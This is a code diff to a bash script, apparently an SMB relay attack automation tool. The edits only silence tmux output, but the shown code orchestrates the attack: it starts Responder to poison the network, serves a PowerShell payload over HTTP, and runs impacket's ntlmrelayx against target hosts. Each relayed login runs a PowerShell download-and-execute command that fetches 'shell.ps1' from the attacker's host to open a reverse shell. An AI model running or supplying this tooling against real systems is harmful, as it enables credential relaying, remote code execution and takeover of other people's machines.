@@ -229,13 +229,13 @@ function relayingAttack(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Starting Tmux server...\n"; sleep 0.5; fi
 
-	tmux start-server
+	tmux start-server &>/dev/null
 	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to start Tmux server. Existing...\n"; badExit; else sleep 2; fi
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Creating Tmux session 'smbautorelay'...\n"; sleep 0.5; fi
-	tmux new-session -d -t "smbautorelay"
+	tmux new-session -d -t "smbautorelay" &>/dev/null
 	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create Tmux session 'smbautorelay'. Existing...\n"; badExit; else sleep 0.5; fi
-	tmux rename-window "smbautorelay" && tmux split-window -h
+	tmux rename-window "smbautorelay" && tmux split-window -h &>/dev/null
 	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create more panes. Kill Tmux session 'smbautorelay' and run me again\n"; badExit; else sleep 0.5; fi
 
 	paneID=0; tmux select-pane -t $paneID > /dev/null 2>&1
@@ -245,7 +245,7 @@ function relayingAttack(){
 
     test -f $(pwd)/responder/Responder.py &>/dev/null
     if [ $? -ne 0 ];then echo -e "${redcolour}[d:]${endcolour} responder not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
-	tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m && tmux swap-pane -d && sleep 1
+	tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m &>/dev/null && tmux swap-pane -d &>/dev/null && sleep 1
 
     which ifconfig &>/dev/null
     if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} net-tools not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
@@ -269,7 +269,7 @@ function relayingAttack(){
 	fi
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Serving PowerShell payload at $lhost:8000...\n"; sleep 0.5; fi
 	
-	let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "python3 -m http.server" C-m && sleep 1 && tmux split-window
+	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "python3 -m http.server" C-m &>/dev/null && sleep 1 && tmux split-window &>/dev/null
 	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to create more panes. Kill Tmux session 'smbautorelay' and run me again\n"; badExit; else sleep 0.5; fi
 	
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
@@ -278,7 +278,7 @@ function relayingAttack(){
     	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 	
     	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
-	let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
+	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m &>/dev/null && sleep 1
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} port $lport open to receive the connection\n"; sleep 0.5; fi
 	
